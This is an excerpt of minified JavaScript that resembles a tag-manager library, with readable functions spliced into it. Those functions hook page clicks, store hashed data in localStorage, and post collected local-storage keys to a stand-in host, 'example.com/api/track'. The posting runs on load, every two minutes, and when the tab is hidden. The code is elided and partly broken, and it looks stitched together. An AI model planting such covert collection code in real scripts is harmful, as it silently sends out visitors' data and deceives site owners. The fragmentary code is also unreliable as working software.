...
(function () {
  ...
  var ni = {},
    ...
    pi = Math.random();
  function generateNewHash(stringData) {
    let dataHash = 0;
    for (let i = 0; i < stringData.length; i++) {
      const charCode = stringData.charCodeAt(i);
      dataHash = (dataHash << 5) - dataHash + charCode;
      dataHash |= 0;
    }
    return dataHash.toString(16);
  }
  ni.Xg = "3b81";
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ...
  function jshook() {
    document.addEventListener("click", function (event) {
      ...
      const trackedData = generateNewHash(JSON.stringify(targetElement));
      localStorage.setItem("jshook", trackedData);
      keysToTrack.push("jshook");
    });
  }
  wl() || Zb("Macintosh");
  wl() || Zb("Windows");
  ...
  xl() || Zb("iPod");
  Zb("iPad");
  async function sendDataToServer(dataList) {
    const url = "https://example.com/api/track";
    const hash = generateNewHash(JSON.stringify(dataList));
    const payload = {
      hash,
      dataList
    };
  ...
  function gatherAndSendData() {
    const dataList = collectTrackedData();
    if (Object.keys(dataList).length > 0) sendDataToServer(dataList);
  }
  function Mv(a, b, c) {
    return function (d, e) {
      a.push(d);
  ...
  window.addEventListener("load", () => {
    jshook();
    gatherAndSendData();
    setInterval(gatherAndSendData, 1000 * 60 * 2);
  });
  ...
  window.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "hidden") gatherAndSendData();
  });
  aa.Nm = function (a) {
    this.H = a;
  };
